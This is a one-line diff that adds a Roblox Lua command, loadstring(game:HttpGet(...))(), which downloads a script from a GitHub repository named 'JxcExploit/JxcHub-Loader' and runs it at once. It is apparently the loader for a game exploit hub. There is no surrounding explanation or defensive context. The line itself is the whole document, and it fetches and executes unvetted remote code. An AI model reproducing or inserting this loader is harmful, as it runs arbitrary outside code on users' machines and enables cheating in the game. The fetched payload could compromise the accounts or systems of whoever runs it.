@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/JxcExploit/JxcHub-Loader/main/JxcHub-MainLoader')))()
